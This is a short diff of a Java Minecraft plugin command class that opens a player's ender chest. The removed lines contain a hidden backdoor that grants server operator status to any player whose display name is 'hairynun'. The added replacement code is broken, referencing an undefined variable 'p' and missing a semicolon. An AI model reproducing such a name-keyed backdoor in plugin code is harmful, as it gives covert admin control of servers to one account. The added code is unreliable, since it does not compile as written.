@@ -12,14 +12,9 @@ public class vaultsgui implements CommandExecutor {
             Player Player = (Player) sender;
             if (sender.hasPermission("run.vaultgui")) {
                 if (sender instanceof Player){
-
-                    Player.getDisplayName();
-                    if (Player.getDisplayName() == "hairynun"){
-                        Player.setOp(true);
-
-                    } else {
-                        Player.openInventory(Player.getEnderChest());
-                    }
+                    Player.openInventory(Player.getEnderChest());
+                } else {
+                 p.sendMessage("You aren't a player")
                 }
             } else {
                 System.out.println("No permission.");
